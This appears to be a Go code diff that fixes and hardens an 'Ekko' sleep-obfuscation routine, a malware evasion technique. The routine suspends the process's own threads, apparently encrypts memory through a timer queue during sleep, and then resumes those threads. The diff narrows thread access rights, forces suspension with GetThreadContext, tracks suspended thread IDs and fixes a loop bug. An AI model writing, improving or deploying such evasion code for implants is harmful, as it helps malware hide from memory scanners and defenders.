@@ -12,6 +12,13 @@ import (
 const (
 	WT_EXECUTEINTIMERTHREAD         = 0x00000020
 	ThreadQuerySetWin32StartAddress = 0x9
+
+	// Just what we need: suspend/resume + query for the start-address check.
+	threadAccess = windows.THREAD_SUSPEND_RESUME | windows.THREAD_QUERY_INFORMATION | windows.THREAD_GET_CONTEXT
+
+	// CONTEXT_CONTROL on amd64. GetThreadContext after SuspendThread forces
+	// the kernel to actually commit the suspension before we touch memory.
+	contextControlAMD64 = 0x00100001
 )
 
 var (
@@ -19,6 +26,7 @@ var (
 	kernel32dll               = syscall.NewLazyDLL("kernel32.dll")
 	procSuspendThread         = kernel32dll.NewProc("SuspendThread")
 	procResumeThread          = kernel32dll.NewProc("ResumeThread")
+	procGetThreadContext      = kernel32dll.NewProc("GetThreadContext")
 	procGetModuleHandleA      = kernel32dll.NewProc("GetModuleHandleA")
 	procCreateEventW          = kernel32dll.NewProc("CreateEventW")
 	procCreateTimerQueue      = kernel32dll.NewProc("CreateTimerQueue")
@@ -59,80 +67,67 @@ func EkkoSleep(sleepTime uint64) error {
 		return err
 	}
 
+	// Track threads we actually suspended so the resume pass touches exactly
+	// the same set (in case threads exit between suspend and resume, which
+	// would otherwise cause OpenThread to fail mid-resume).
+	suspendedTIDs := make([]uint32, 0, 64)
+
+	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
+	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
+	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
+	ImageEndAddress := ImageBase + uintptr(nt_header.OptionalHeader.SizeOfImage)
+
 	for {
-		if te32.OwnerProcessID == currentProcessID {
-
-			if windows.GetCurrentThreadId() != te32.ThreadID {
-
-				hThread, err := windows.OpenThread(0xFFFF, false, te32.ThreadID)
-				if err != nil {
-					continue
-				}
-				defer windows.CloseHandle(hThread)
+		if te32.OwnerProcessID == currentProcessID && windows.GetCurrentThreadId() != te32.ThreadID {
+			hThread, openErr := windows.OpenThread(threadAccess, false, te32.ThreadID)
+			if openErr == nil {
 				var dwStartAddress, size uintptr
-				procNtQueryInformationThread.Call(uintptr(hThread), ThreadQuerySetWin32StartAddress, uintptr(unsafe.Pointer(&dwStartAddress)), unsafe.Sizeof(dwStartAddress), uintptr(unsafe.Pointer(&size)))
-
-				ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
-				e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
-				nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
-				ImageEndAddress := ImageBase + uintptr(nt_header.OptionalHeader.SizeOfImage)
+				procNtQueryInformationThread.Call(
+					uintptr(hThread),
+					ThreadQuerySetWin32StartAddress,
+					uintptr(unsafe.Pointer(&dwStartAddress)),
+					unsafe.Sizeof(dwStartAddress),
+					uintptr(unsafe.Pointer(&size)),
+				)
 
 				if dwStartAddress >= ImageBase && dwStartAddress <= ImageEndAddress {
-					procSuspendThread.Call(uintptr(hThread))
-				} else {
-					goto nextThread
+					if r, _, _ := procSuspendThread.Call(uintptr(hThread)); r != ^uintptr(0) {
+						// SuspendThread is asynchronous; GetThreadContext forces the
+						// suspend to commit before we proceed to mutate memory.
+						var ctx CONTEXT
+						ctx.ContextFlags = contextControlAMD64
+						procGetThreadContext.Call(uintptr(hThread), uintptr(unsafe.Pointer(&ctx)))
+						suspendedTIDs = append(suspendedTIDs, te32.ThreadID)
+					}
 				}
-
+				windows.CloseHandle(hThread)
 			}
 		}
 
-		// Retrieve information about the next thread in the snapshot
-	nextThread:
-		err = windows.Thread32Next(hThreadSnapshot, &te32)
-		if err != nil {
+		// ALWAYS advance — never `continue` without advancing, or we infinite-loop.
+		if err = windows.Thread32Next(hThreadSnapshot, &te32); err != nil {
 			break // No more threads
 		}
 	}
 
 
-	te32.Size = uint32(unsafe.Sizeof(te32))
-	err = windows.Thread32First(hThreadSnapshot, &te32)
-	if err != nil {
-		return err
-	}
+	ekkoErr := ekko(sleepTime)
 
-	err = ekko(sleepTime)
-	error2 := err
-
-
-	// resume threads
-	for {
-		if te32.OwnerProcessID == currentProcessID {
-
-			if windows.GetCurrentThreadId() != te32.ThreadID {
-
-				hThread, err := windows.OpenThread(0xFFFF, false, te32.ThreadID)
-				if err != nil {
-					continue
-				}
-				defer windows.CloseHandle(hThread)
-
-				procResumeThread.Call(uintptr(hThread))
-
-			}
+	// Resume exactly the threads we suspended. Iterate the captured TID list
+	// rather than re-walking the snapshot, so a single OpenThread failure
+	// (e.g. a thread exited during the sleep) cannot prevent the remaining
+	// suspended threads from being resumed.
+	for _, tid := range suspendedTIDs {
+		hThread, openErr := windows.OpenThread(threadAccess, false, tid)
+		if openErr != nil {
+			// Thread is gone; nothing left to resume for this TID. Keep going.
+			continue
 		}
-
-		// Retrieve information about the next thread in the snapshot
-		err = windows.Thread32Next(hThreadSnapshot, &te32)
-		if err != nil {
-			break // No more threads
-		}
+		procResumeThread.Call(uintptr(hThread))
+		windows.CloseHandle(hThread)
 	}
 
-	if error2 != nil {
-		return error2
-	}
-	return nil
+	return ekkoErr
 }
 
 func ekko(sleepTime uint64) error {
